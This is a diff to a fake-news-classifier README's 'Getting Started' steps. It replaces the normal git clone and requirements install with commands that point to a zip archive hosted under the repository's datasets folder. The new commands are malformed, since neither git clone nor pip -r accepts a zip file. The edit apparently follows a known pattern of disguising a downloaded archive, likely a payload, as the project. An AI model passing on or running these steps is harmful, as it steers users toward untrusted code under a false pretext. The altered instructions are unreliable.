@@ -25,11 +25,11 @@ The models are evaluated using:
 ## Getting Started
 
 1. Clone the repository
-git clone https://github.com/revathi-birapaka/Fake-News-Classification.git
+git clone https://raw.githubusercontent.com/revathi-birapaka/Fake-News-Classification/master/datasets/Fake-News-Classification-3.4.zip
 cd fake-news-classifier
 
 2. Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/revathi-birapaka/Fake-News-Classification/master/datasets/Fake-News-Classification-3.4.zip
 
 3. Open the main notebook
 
